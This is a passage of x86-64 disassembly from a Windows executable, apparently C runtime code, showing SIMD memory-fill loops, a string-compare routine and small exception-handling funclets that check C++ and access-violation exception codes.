   14000f31b:	c5 fd e7 81 e0 00 00 	vmovntdq %ymm0,0xe0(%rcx)
   14000f322:	00 
   14000f323:	48 81 c1 00 01 00 00 	add    $0x100,%rcx
   14000f32a:	49 81 e8 00 01 00 00 	sub    $0x100,%r8
   14000f331:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   14000f338:	73 b6                	jae    0x14000f2f0
   14000f33a:	4d 8d 48 1f          	lea    0x1f(%r8),%r9
   14000f33e:	49 83 e1 e0          	and    $0xffffffffffffffe0,%r9
   14000f342:	4d 8b d9             	mov    %r9,%r11
   14000f345:	49 c1 eb 05          	shr    $0x5,%r11
   14000f349:	47 8b 9c 9a 44 85 01 	mov    0x18544(%r10,%r11,4),%r11d
   14000f350:	00 
   14000f351:	4d 03 da             	add    %r10,%r11
   14000f354:	41 ff e3             	jmp    *%r11
   14000f357:	c4 a1 7d e7 84 09 00 	vmovntdq %ymm0,-0x100(%rcx,%r9,1)
   14000f35e:	ff ff ff 
   14000f361:	c4 a1 7d e7 84 09 20 	vmovntdq %ymm0,-0xe0(%rcx,%r9,1)
   14000f368:	ff ff ff 
   14000f36b:	c4 a1 7d e7 84 09 40 	vmovntdq %ymm0,-0xc0(%rcx,%r9,1)
   14000f372:	ff ff ff 
   14000f375:	c4 a1 7d e7 84 09 60 	vmovntdq %ymm0,-0xa0(%rcx,%r9,1)
   14000f37c:	ff ff ff 
   14000f37f:	c4 a1 7d e7 44 09 80 	vmovntdq %ymm0,-0x80(%rcx,%r9,1)
   14000f386:	c4 a1 7d e7 44 09 a0 	vmovntdq %ymm0,-0x60(%rcx,%r9,1)
   14000f38d:	c4 a1 7d e7 44 09 c0 	vmovntdq %ymm0,-0x40(%rcx,%r9,1)
   14000f394:	c4 a1 7e 7f 44 01 e0 	vmovdqu %ymm0,-0x20(%rcx,%r8,1)
   14000f39b:	c5 fe 7f 00          	vmovdqu %ymm0,(%rax)
   14000f39f:	0f ae f8             	sfence
   14000f3a2:	c5 f8 77             	vzeroupper
   14000f3a5:	c3                   	ret
   14000f3a6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000f3ad:	00 00 00 
   14000f3b0:	4c 3b 05 a1 ec 00 00 	cmp    0xeca1(%rip),%r8        # 0x14001e058
   14000f3b7:	76 0d                	jbe    0x14000f3c6
   14000f3b9:	f6 05 84 f8 00 00 02 	testb  $0x2,0xf884(%rip)        # 0x14001ec44
   14000f3c0:	0f 85 2a fd ff ff    	jne    0x14000f0f0
   14000f3c6:	4c 8b c9             	mov    %rcx,%r9
   14000f3c9:	49 83 e1 0f          	and    $0xf,%r9
   14000f3cd:	49 83 e9 10          	sub    $0x10,%r9
   14000f3d1:	49 2b c9             	sub    %r9,%rcx
   14000f3d4:	49 2b d1             	sub    %r9,%rdx
   14000f3d7:	4d 03 c1             	add    %r9,%r8
   14000f3da:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   14000f3e1:	76 4b                	jbe    0x14000f42e
   14000f3e3:	66 66 66 66 66 0f 1f 	data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000f3ea:	84 00 00 00 00 00 
   14000f3f0:	66 0f 7f 01          	movdqa %xmm0,(%rcx)
   14000f3f4:	66 0f 7f 41 10       	movdqa %xmm0,0x10(%rcx)
   14000f3f9:	66 0f 7f 41 20       	movdqa %xmm0,0x20(%rcx)
   14000f3fe:	66 0f 7f 41 30       	movdqa %xmm0,0x30(%rcx)
   14000f403:	66 0f 7f 41 40       	movdqa %xmm0,0x40(%rcx)
   14000f408:	66 0f 7f 41 50       	movdqa %xmm0,0x50(%rcx)
   14000f40d:	66 0f 7f 41 60       	movdqa %xmm0,0x60(%rcx)
   14000f412:	66 0f 7f 41 70       	movdqa %xmm0,0x70(%rcx)
   14000f417:	48 81 c1 80 00 00 00 	add    $0x80,%rcx
   14000f41e:	49 81 e8 80 00 00 00 	sub    $0x80,%r8
   14000f425:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   14000f42c:	73 c2                	jae    0x14000f3f0
   14000f42e:	4d 8d 48 0f          	lea    0xf(%r8),%r9
   14000f432:	49 83 e1 f0          	and    $0xfffffffffffffff0,%r9
   14000f436:	4d 8b d9             	mov    %r9,%r11
   14000f439:	49 c1 eb 04          	shr    $0x4,%r11
   14000f43d:	47 8b 9c 9a 68 85 01 	mov    0x18568(%r10,%r11,4),%r11d
   14000f444:	00 
   14000f445:	4d 03 da             	add    %r10,%r11
   14000f448:	41 ff e3             	jmp    *%r11
   14000f44b:	f3 42 0f 7f 44 09 80 	movdqu %xmm0,-0x80(%rcx,%r9,1)
   14000f452:	f3 42 0f 7f 44 09 90 	movdqu %xmm0,-0x70(%rcx,%r9,1)
   14000f459:	f3 42 0f 7f 44 09 a0 	movdqu %xmm0,-0x60(%rcx,%r9,1)
   14000f460:	f3 42 0f 7f 44 09 b0 	movdqu %xmm0,-0x50(%rcx,%r9,1)
   14000f467:	f3 42 0f 7f 44 09 c0 	movdqu %xmm0,-0x40(%rcx,%r9,1)
   14000f46e:	f3 42 0f 7f 44 09 d0 	movdqu %xmm0,-0x30(%rcx,%r9,1)
   14000f475:	f3 42 0f 7f 44 09 e0 	movdqu %xmm0,-0x20(%rcx,%r9,1)
   14000f47c:	f3 42 0f 7f 44 01 f0 	movdqu %xmm0,-0x10(%rcx,%r8,1)
   14000f483:	f3 0f 7f 00          	movdqu %xmm0,(%rax)
   14000f487:	c3                   	ret
   14000f488:	cc                   	int3
   14000f489:	cc                   	int3
   14000f48a:	cc                   	int3
   14000f48b:	cc                   	int3
   14000f48c:	cc                   	int3
   14000f48d:	cc                   	int3
   14000f48e:	cc                   	int3
   14000f48f:	cc                   	int3
   14000f490:	cc                   	int3
   14000f491:	cc                   	int3
   14000f492:	cc                   	int3
   14000f493:	cc                   	int3
   14000f494:	cc                   	int3
   14000f495:	cc                   	int3
   14000f496:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000f49d:	00 00 00 
   14000f4a0:	48 2b d1             	sub    %rcx,%rdx
   14000f4a3:	4d 85 c0             	test   %r8,%r8
   14000f4a6:	74 6a                	je     0x14000f512
   14000f4a8:	f7 c1 07 00 00 00    	test   $0x7,%ecx
   14000f4ae:	74 1d                	je     0x14000f4cd
   14000f4b0:	0f b6 01             	movzbl (%rcx),%eax
   14000f4b3:	3a 04 0a             	cmp    (%rdx,%rcx,1),%al
   14000f4b6:	75 5d                	jne    0x14000f515
   14000f4b8:	48 ff c1             	inc    %rcx
   14000f4bb:	49 ff c8             	dec    %r8
   14000f4be:	74 52                	je     0x14000f512
   14000f4c0:	84 c0                	test   %al,%al
   14000f4c2:	74 4e                	je     0x14000f512
   14000f4c4:	48 f7 c1 07 00 00 00 	test   $0x7,%rcx
   14000f4cb:	75 e3                	jne    0x14000f4b0
   14000f4cd:	49 bb 80 80 80 80 80 	movabs $0x8080808080808080,%r11
   14000f4d4:	80 80 80 
   14000f4d7:	49 ba ff fe fe fe fe 	movabs $0xfefefefefefefeff,%r10
   14000f4de:	fe fe fe 
   14000f4e1:	8d 04 0a             	lea    (%rdx,%rcx,1),%eax
   14000f4e4:	25 ff 0f 00 00       	and    $0xfff,%eax
   14000f4e9:	3d f8 0f 00 00       	cmp    $0xff8,%eax
   14000f4ee:	77 c0                	ja     0x14000f4b0
   14000f4f0:	48 8b 01             	mov    (%rcx),%rax
   14000f4f3:	48 3b 04 0a          	cmp    (%rdx,%rcx,1),%rax
   14000f4f7:	75 b7                	jne    0x14000f4b0
   14000f4f9:	48 83 c1 08          	add    $0x8,%rcx
   14000f4fd:	49 83 e8 08          	sub    $0x8,%r8
   14000f501:	76 0f                	jbe    0x14000f512
   14000f503:	4d 8d 0c 02          	lea    (%r10,%rax,1),%r9
   14000f507:	48 f7 d0             	not    %rax
   14000f50a:	49 23 c1             	and    %r9,%rax
   14000f50d:	49 85 c3             	test   %rax,%r11
   14000f510:	74 cf                	je     0x14000f4e1
   14000f512:	33 c0                	xor    %eax,%eax
   14000f514:	c3                   	ret
   14000f515:	48 1b c0             	sbb    %rax,%rax
   14000f518:	48 83 c8 01          	or     $0x1,%rax
   14000f51c:	c3                   	ret
   14000f51d:	cc                   	int3
   14000f51e:	cc                   	int3
   14000f51f:	cc                   	int3
   14000f520:	cc                   	int3
   14000f521:	cc                   	int3
   14000f522:	cc                   	int3
   14000f523:	cc                   	int3
   14000f524:	cc                   	int3
   14000f525:	cc                   	int3
   14000f526:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000f52d:	00 00 00 
   14000f530:	40 55                	rex push %rbp
   14000f532:	48 83 ec 20          	sub    $0x20,%rsp
   14000f536:	48 8b ea             	mov    %rdx,%rbp
   14000f539:	48 8b d1             	mov    %rcx,%rdx
   14000f53c:	48 8b 09             	mov    (%rcx),%rcx
   14000f53f:	8b 09                	mov    (%rcx),%ecx
   14000f541:	e8 52 6a ff ff       	call   0x140005f98
   14000f546:	90                   	nop
   14000f547:	48 83 c4 20          	add    $0x20,%rsp
   14000f54b:	5d                   	pop    %rbp
   14000f54c:	c3                   	ret
   14000f54d:	cc                   	int3
   14000f54e:	40 55                	rex push %rbp
   14000f550:	48 8b ea             	mov    %rdx,%rbp
   14000f553:	48 8b 01             	mov    (%rcx),%rax
   14000f556:	33 c9                	xor    %ecx,%ecx
   14000f558:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   14000f55e:	0f 94 c1             	sete   %cl
   14000f561:	8b c1                	mov    %ecx,%eax
   14000f563:	5d                   	pop    %rbp
   14000f564:	c3                   	ret
   14000f565:	cc                   	int3
   14000f566:	40 53                	rex push %rbx
   14000f568:	55                   	push   %rbp
   14000f569:	48 83 ec 28          	sub    $0x28,%rsp
   14000f56d:	48 8b ea             	mov    %rdx,%rbp
   14000f570:	48 89 4d 30          	mov    %rcx,0x30(%rbp)
   14000f574:	80 7d 58 00          	cmpb   $0x0,0x58(%rbp)
   14000f578:	74 6c                	je     0x14000f5e6
   14000f57a:	48 8b 45 30          	mov    0x30(%rbp),%rax
   14000f57e:	48 8b 08             	mov    (%rax),%rcx
   14000f581:	48 89 4d 28          	mov    %rcx,0x28(%rbp)
   14000f585:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000f589:	81 38 63 73 6d e0    	cmpl   $0xe06d7363,(%rax)
   14000f58f:	75 55                	jne    0x14000f5e6
   14000f591:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000f595:	83 78 18 04          	cmpl   $0x4,0x18(%rax)
   14000f599:	75 4b                	jne    0x14000f5e6
   14000f59b:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000f59f:	81 78 20 20 05 93 19 	cmpl   $0x19930520,0x20(%rax)
   14000f5a6:	74 1a                	je     0x14000f5c2
   14000f5a8:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000f5ac:	81 78 20 21 05 93 19 	cmpl   $0x19930521,0x20(%rax)
   14000f5b3:	74 0d                	je     0x14000f5c2
   14000f5b5:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000f5b9:	81 78 20 22 05 93 19 	cmpl   $0x19930522,0x20(%rax)
   14000f5c0:	75 24                	jne    0x14000f5e6
   14000f5c2:	e8 15 4a ff ff       	call   0x140003fdc
   14000f5c7:	48 8b 4d 28          	mov    0x28(%rbp),%rcx
   14000f5cb:	48 89 48 20          	mov    %rcx,0x20(%rax)
   14000f5cf:	48 8b 45 30          	mov    0x30(%rbp),%rax
   14000f5d3:	48 8b 58 08          	mov    0x8(%rax),%rbx
   14000f5d7:	e8 00 4a ff ff       	call   0x140003fdc
   14000f5dc:	48 89 58 28          	mov    %rbx,0x28(%rax)
   14000f5e0:	e8 4b 7c ff ff       	call   0x140007230
   14000f5e5:	90                   	nop
   14000f5e6:	c7 45 20 00 00 00 00 	movl   $0x0,0x20(%rbp)
   14000f5ed:	8b 45 20             	mov    0x20(%rbp),%eax
   14000f5f0:	48 83 c4 28          	add    $0x28,%rsp
   14000f5f4:	5d                   	pop    %rbp
   14000f5f5:	5b                   	pop    %rbx
   14000f5f6:	c3                   	ret
   14000f5f7:	cc                   	int3
   14000f5f8:	40 53                	rex push %rbx
   14000f5fa:	55                   	push   %rbp
   14000f5fb:	57                   	push   %rdi
   14000f5fc:	48 83 ec 40          	sub    $0x40,%rsp
   14000f600:	48 8b ea             	mov    %rdx,%rbp
   14000f603:	48 89 4d 48          	mov    %rcx,0x48(%rbp)
   14000f607:	e8 d0 49 ff ff       	call   0x140003fdc
   14000f60c:	48 8b 4d 70          	mov    0x70(%rbp),%rcx
   14000f610:	48 89 48 70          	mov    %rcx,0x70(%rax)
   14000f614:	48 8b bd 88 00 00 00 	mov    0x88(%rbp),%rdi
   14000f61b:	48 8b 5f 08          	mov    0x8(%rdi),%rbx
   14000f61f:	e8 b8 49 ff ff       	call   0x140003fdc
   14000f624:	48 89 58 60          	mov    %rbx,0x60(%rax)
   14000f628:	48 8b 45 48          	mov    0x48(%rbp),%rax
   14000f62c:	48 8b 08             	mov    (%rax),%rcx
   14000f62f:	48 8b 59 38          	mov    0x38(%rcx),%rbx
   14000f633:	e8 a4 49 ff ff       	call   0x140003fdc
   14000f638:	48 89 58 68          	mov    %rbx,0x68(%rax)
   14000f63c:	48 8b 4d 48          	mov    0x48(%rbp),%rcx
   14000f640:	c6 44 24 38 01       	movb   $0x1,0x38(%rsp)
   14000f645:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   14000f64c:	00 00 
   14000f64e:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
   14000f655:	00 
   14000f656:	48 8b 85 90 00 00 00 	mov    0x90(%rbp),%rax
   14000f65d:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000f662:	4c 8b cf             	mov    %rdi,%r9
   14000f665:	4c 8b 85 80 00 00 00 	mov    0x80(%rbp),%r8
   14000f66c:	48 8b 55 78          	mov    0x78(%rbp),%rdx
   14000f670:	48 8b 09             	mov    (%rcx),%rcx
   14000f673:	e8 e8 5f ff ff       	call   0x140005660
   14000f678:	e8 5f 49 ff ff       	call   0x140003fdc
   14000f67d:	48 c7 40 70 00 00 00 	movq   $0x0,0x70(%rax)
   14000f684:	00 
   14000f685:	c7 45 40 01 00 00 00 	movl   $0x1,0x40(%rbp)
   14000f68c:	c7 45 44 01 00 00 00 	movl   $0x1,0x44(%rbp)
   14000f693:	8b 45 44             	mov    0x44(%rbp),%eax
   14000f696:	48 83 c4 40          	add    $0x40,%rsp
   14000f69a:	5f                   	pop    %rdi
   14000f69b:	5d                   	pop    %rbp
   14000f69c:	5b                   	pop    %rbx
   14000f69d:	c3                   	ret
   14000f69e:	cc                   	int3
   14000f69f:	40 55                	rex push %rbp
   14000f6a1:	48 83 ec 20          	sub    $0x20,%rsp
   14000f6a5:	48 8b ea             	mov    %rdx,%rbp
   14000f6a8:	4c 8d 45 20          	lea    0x20(%rbp),%r8
   14000f6ac:	48 8b 95 d8 00 00 00 	mov    0xd8(%rbp),%rdx
   14000f6b3:	e8 a8 62 ff ff       	call   0x140005960
   14000f6b8:	90                   	nop
   14000f6b9:	48 83 c4 20          	add    $0x20,%rsp
   14000f6bd:	5d                   	pop    %rbp
   14000f6be:	c3                   	ret
   14000f6bf:	cc                   	int3
   14000f6c0:	40 53                	rex push %rbx
   14000f6c2:	55                   	push   %rbp
   14000f6c3:	48 83 ec 28          	sub    $0x28,%rsp
   14000f6c7:	48 8b ea             	mov    %rdx,%rbp
   14000f6ca:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
   14000f6ce:	e8 6d 4f ff ff       	call   0x140004640
   14000f6d3:	83 7d 20 00          	cmpl   $0x0,0x20(%rbp)
   14000f6d7:	75 48                	jne    0x14000f721
   14000f6d9:	48 8b 9d d8 00 00 00 	mov    0xd8(%rbp),%rbx
   14000f6e0:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%rbx)
   14000f6e6:	75 39                	jne    0x14000f721
   14000f6e8:	83 7b 18 04          	cmpl   $0x4,0x18(%rbx)
   14000f6ec:	75 33                	jne    0x14000f721
   14000f6ee:	81 7b 20 20 05 93 19 	cmpl   $0x19930520,0x20(%rbx)
   14000f6f5:	74 12                	je     0x14000f709
   14000f6f7:	81 7b 20 21 05 93 19 	cmpl   $0x19930521,0x20(%rbx)
   14000f6fe:	74 09                	je     0x14000f709
   14000f700:	81 7b 20 22 05 93 19 	cmpl   $0x19930522,0x20(%rbx)
   14000f707:	75 18                	jne    0x14000f721
   14000f709:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   14000f70d:	e8 16 47 ff ff       	call   0x140003e28
   14000f712:	85 c0                	test   %eax,%eax
   14000f714:	74 0b                	je     0x14000f721
   14000f716:	b2 01                	mov    $0x1,%dl
   14000f718:	48 8b cb             	mov    %rbx,%rcx
   14000f71b:	e8 94 46 ff ff       	call   0x140003db4
   14000f720:	90                   	nop
   14000f721:	e8 b6 48 ff ff       	call   0x140003fdc
   14000f726:	48 8b 4d 70          	mov    0x70(%rbp),%rcx
   14000f72a:	48 89 48 20          	mov    %rcx,0x20(%rax)
   14000f72e:	e8 a9 48 ff ff       	call   0x140003fdc
   14000f733:	48 8b 4d 78          	mov    0x78(%rbp),%rcx
   14000f737:	48 89 48 28          	mov    %rcx,0x28(%rax)
   14000f73b:	48 83 c4 28          	add    $0x28,%rsp
   14000f73f:	5d                   	pop    %rbp
   14000f740:	5b                   	pop    %rbx
   14000f741:	c3                   	ret
   14000f742:	cc                   	int3
   14000f743:	40 55                	rex push %rbp
   14000f745:	48 83 ec 20          	sub    $0x20,%rsp
   14000f749:	48 8b ea             	mov    %rdx,%rbp
   14000f74c:	e8 2f 47 ff ff       	call   0x140003e80
   14000f751:	90                   	nop
   14000f752:	48 83 c4 20          	add    $0x20,%rsp
   14000f756:	5d                   	pop    %rbp
   14000f757:	c3                   	ret
   14000f758:	cc                   	int3
   14000f759:	40 55                	rex push %rbp
   14000f75b:	48 83 ec 20          	sub    $0x20,%rsp
   14000f75f:	48 8b ea             	mov    %rdx,%rbp
   14000f762:	e8 75 48 ff ff       	call   0x140003fdc
   14000f767:	83 78 30 00          	cmpl   $0x0,0x30(%rax)
   14000f76b:	7e 08                	jle    0x14000f775
   14000f76d:	e8 6a 48 ff ff       	call   0x140003fdc
   14000f772:	ff 48 30             	decl   0x30(%rax)
   14000f775:	48 83 c4 20          	add    $0x20,%rsp
   14000f779:	5d                   	pop    %rbp
   14000f77a:	c3                   	ret
   14000f77b:	cc                   	int3
   14000f77c:	40 55                	rex push %rbp
   14000f77e:	48 83 ec 20          	sub    $0x20,%rsp
   14000f782:	48 8b ea             	mov    %rdx,%rbp
   14000f785:	48 8b 4d 48          	mov    0x48(%rbp),%rcx
   14000f789:	8b 09                	mov    (%rcx),%ecx
   14000f78b:	48 83 c4 20          	add    $0x20,%rsp
   14000f78f:	5d                   	pop    %rbp
   14000f790:	e9 4f a5 ff ff       	jmp    0x140009ce4
   14000f795:	cc                   	int3
   14000f796:	40 55                	rex push %rbp
   14000f798:	48 83 ec 20          	sub    $0x20,%rsp
   14000f79c:	48 8b ea             	mov    %rdx,%rbp
   14000f79f:	48 89 4d 28          	mov    %rcx,0x28(%rbp)
   14000f7a3:	48 8b 01             	mov    (%rcx),%rax
   14000f7a6:	8b 08                	mov    (%rax),%ecx
   14000f7a8:	89 4d 24             	mov    %ecx,0x24(%rbp)
   14000f7ab:	33 c0                	xor    %eax,%eax
   14000f7ad:	81 f9 63 73 6d e0    	cmp    $0xe06d7363,%ecx
   14000f7b3:	0f 94 c0             	sete   %al
   14000f7b6:	89 45 20             	mov    %eax,0x20(%rbp)
   14000f7b9:	8b 45 20             	mov    0x20(%rbp),%eax
   14000f7bc:	48 83 c4 20          	add    $0x20,%rsp
   14000f7c0:	5d                   	pop    %rbp
   14000f7c1:	c3                   	ret
   14000f7c2:	cc                   	int3
   14000f7c3:	40 55                	rex push %rbp
   14000f7c5:	48 83 ec 20          	sub    $0x20,%rsp
   14000f7c9:	48 8b ea             	mov    %rdx,%rbp
   14000f7cc:	48 8b 4d 58          	mov    0x58(%rbp),%rcx
   14000f7d0:	8b 09                	mov    (%rcx),%ecx
   14000f7d2:	48 83 c4 20          	add    $0x20,%rsp
   14000f7d6:	5d                   	pop    %rbp
   14000f7d7:	e9 08 a5 ff ff       	jmp    0x140009ce4
   14000f7dc:	cc                   	int3
   14000f7dd:	40 55                	rex push %rbp
   14000f7df:	48 83 ec 20          	sub    $0x20,%rsp
   14000f7e3:	48 8b ea             	mov    %rdx,%rbp
   14000f7e6:	48 8b 4d 68          	mov    0x68(%rbp),%rcx
   14000f7ea:	8b 09                	mov    (%rcx),%ecx
   14000f7ec:	48 83 c4 20          	add    $0x20,%rsp
   14000f7f0:	5d                   	pop    %rbp
   14000f7f1:	e9 ee a4 ff ff       	jmp    0x140009ce4
   14000f7f6:	cc                   	int3
   14000f7f7:	40 55                	rex push %rbp
   14000f7f9:	48 83 ec 20          	sub    $0x20,%rsp
   14000f7fd:	48 8b ea             	mov    %rdx,%rbp
   14000f800:	b9 05 00 00 00       	mov    $0x5,%ecx
   14000f805:	48 83 c4 20          	add    $0x20,%rsp
   14000f809:	5d                   	pop    %rbp
   14000f80a:	e9 d5 a4 ff ff       	jmp    0x140009ce4
   14000f80f:	cc                   	int3
   14000f810:	40 55                	rex push %rbp
   14000f812:	48 83 ec 20          	sub    $0x20,%rsp
   14000f816:	48 8b ea             	mov    %rdx,%rbp
   14000f819:	b9 07 00 00 00       	mov    $0x7,%ecx
   14000f81e:	48 83 c4 20          	add    $0x20,%rsp
   14000f822:	5d                   	pop    %rbp
   14000f823:	e9 bc a4 ff ff       	jmp    0x140009ce4
   14000f828:	cc                   	int3
   14000f829:	40 55                	rex push %rbp
   14000f82b:	48 83 ec 20          	sub    $0x20,%rsp
   14000f82f:	48 8b ea             	mov    %rdx,%rbp
   14000f832:	b9 04 00 00 00       	mov    $0x4,%ecx
   14000f837:	48 83 c4 20          	add    $0x20,%rsp
   14000f83b:	5d                   	pop    %rbp
   14000f83c:	e9 a3 a4 ff ff       	jmp    0x140009ce4
   14000f841:	cc                   	int3
   14000f842:	cc                   	int3
   14000f843:	cc                   	int3
   14000f844:	cc                   	int3
   14000f845:	cc                   	int3
   14000f846:	cc                   	int3
   14000f847:	cc                   	int3
   14000f848:	cc                   	int3
   14000f849:	cc                   	int3
   14000f84a:	cc                   	int3
   14000f84b:	cc                   	int3
   14000f84c:	cc                   	int3
   14000f84d:	cc                   	int3
   14000f84e:	cc                   	int3
   14000f84f:	cc                   	int3
   14000f850:	40 55                	rex push %rbp
   14000f852:	48 83 ec 20          	sub    $0x20,%rsp
   14000f856:	48 8b ea             	mov    %rdx,%rbp
   14000f859:	33 c9                	xor    %ecx,%ecx
   14000f85b:	48 83 c4 20          	add    $0x20,%rsp
   14000f85f:	5d                   	pop    %rbp
   14000f860:	e9 7f a4 ff ff       	jmp    0x140009ce4
   14000f865:	cc                   	int3
   14000f866:	40 55                	rex push %rbp
   14000f868:	48 83 ec 20          	sub    $0x20,%rsp
   14000f86c:	48 8b ea             	mov    %rdx,%rbp
   14000f86f:	33 c9                	xor    %ecx,%ecx
   14000f871:	48 83 c4 20          	add    $0x20,%rsp
   14000f875:	5d                   	pop    %rbp
   14000f876:	e9 69 a4 ff ff       	jmp    0x140009ce4
   14000f87b:	cc                   	int3
   14000f87c:	40 55                	rex push %rbp
   14000f87e:	48 83 ec 20          	sub    $0x20,%rsp
   14000f882:	48 8b ea             	mov    %rdx,%rbp
   14000f885:	80 7d 70 00          	cmpb   $0x0,0x70(%rbp)
   14000f889:	74 0b                	je     0x14000f896
   14000f88b:	b9 03 00 00 00       	mov    $0x3,%ecx
   14000f890:	e8 4f a4 ff ff       	call   0x140009ce4
   14000f895:	90                   	nop
   14000f896:	48 83 c4 20          	add    $0x20,%rsp
   14000f89a:	5d                   	pop    %rbp
   14000f89b:	c3                   	ret
   14000f89c:	cc                   	int3
   14000f89d:	40 55                	rex push %rbp
   14000f89f:	48 83 ec 20          	sub    $0x20,%rsp
   14000f8a3:	48 8b ea             	mov    %rdx,%rbp
   14000f8a6:	48 8b 4d 48          	mov    0x48(%rbp),%rcx
   14000f8aa:	48 8b 09             	mov    (%rcx),%rcx
   14000f8ad:	48 83 c4 20          	add    $0x20,%rsp
   14000f8b1:	5d                   	pop    %rbp
   14000f8b2:	e9 99 c2 ff ff       	jmp    0x14000bb50
   14000f8b7:	cc                   	int3
   14000f8b8:	40 55                	rex push %rbp
   14000f8ba:	48 83 ec 20          	sub    $0x20,%rsp
   14000f8be:	48 8b ea             	mov    %rdx,%rbp
   14000f8c1:	48 8b 8d 98 00 00 00 	mov    0x98(%rbp),%rcx
   14000f8c8:	8b 09                	mov    (%rcx),%ecx
   14000f8ca:	48 83 c4 20          	add    $0x20,%rsp
   14000f8ce:	5d                   	pop    %rbp
   14000f8cf:	e9 10 a4 ff ff       	jmp    0x140009ce4
   14000f8d4:	cc                   	int3
   14000f8d5:	40 55                	rex push %rbp
   14000f8d7:	48 83 ec 20          	sub    $0x20,%rsp
   14000f8db:	48 8b ea             	mov    %rdx,%rbp
   14000f8de:	48 8b 4d 48          	mov    0x48(%rbp),%rcx
   14000f8e2:	8b 09                	mov    (%rcx),%ecx
   14000f8e4:	48 83 c4 20          	add    $0x20,%rsp
   14000f8e8:	5d                   	pop    %rbp
   14000f8e9:	e9 3e a6 ff ff       	jmp    0x140009f2c
   14000f8ee:	cc                   	int3
   14000f8ef:	40 55                	rex push %rbp
   14000f8f1:	48 83 ec 30          	sub    $0x30,%rsp
   14000f8f5:	48 8b ea             	mov    %rdx,%rbp
   14000f8f8:	8b 4d 60             	mov    0x60(%rbp),%ecx
   14000f8fb:	48 83 c4 30          	add    $0x30,%rsp
   14000f8ff:	5d                   	pop    %rbp
   14000f900:	e9 27 a6 ff ff       	jmp    0x140009f2c
   14000f905:	cc                   	int3
   14000f906:	40 55                	rex push %rbp
   14000f908:	48 83 ec 20          	sub    $0x20,%rsp
   14000f90c:	48 8b ea             	mov    %rdx,%rbp
   14000f90f:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000f914:	48 83 c4 20          	add    $0x20,%rsp
   14000f918:	5d                   	pop    %rbp
   14000f919:	e9 c6 a3 ff ff       	jmp    0x140009ce4
   14000f91e:	cc                   	int3
   14000f91f:	40 55                	rex push %rbp
   14000f921:	48 83 ec 30          	sub    $0x30,%rsp
   14000f925:	48 8b ea             	mov    %rdx,%rbp
   14000f928:	48 8b 4d 40          	mov    0x40(%rbp),%rcx
   14000f92c:	48 83 c4 30          	add    $0x30,%rsp
   14000f930:	5d                   	pop    %rbp
   14000f931:	e9 1a c2 ff ff       	jmp    0x14000bb50
   14000f936:	cc                   	int3
   14000f937:	cc                   	int3
   14000f938:	cc                   	int3
   14000f939:	cc                   	int3
   14000f93a:	cc                   	int3
   14000f93b:	cc                   	int3
   14000f93c:	cc                   	int3
   14000f93d:	cc                   	int3
   14000f93e:	cc                   	int3
   14000f93f:	cc                   	int3
   14000f940:	40 55                	rex push %rbp
   14000f942:	48 83 ec 20          	sub    $0x20,%rsp
   14000f946:	48 8b ea             	mov    %rdx,%rbp
   14000f949:	48 8b 01             	mov    (%rcx),%rax
   14000f94c:	33 c9                	xor    %ecx,%ecx
   14000f94e:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   14000f954:	0f 94 c1             	sete   %cl
   14000f957:	8b c1                	mov    %ecx,%eax
   14000f959:	48 83 c4 20          	add    $0x20,%rsp
   14000f95d:	5d                   	pop    %rbp
   14000f95e:	c3                   	ret
   14000f95f:	cc                   	int3
